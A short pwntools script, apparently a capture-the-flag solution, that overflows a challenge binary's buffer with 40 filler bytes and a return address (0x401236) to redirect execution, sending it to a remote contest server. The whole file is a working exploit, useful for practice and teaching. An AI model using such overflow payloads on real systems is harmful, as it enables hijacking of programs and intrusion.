from pwn import *

p = process('./wah')
p = remote('challs.actf.co', 31224)

payload = b'A'*40
payload += (0x401236).to_bytes(8, 'little')

p.recv()
p.sendline(payload)
print(p.recv())
print(p.recv())
print(p.recv())
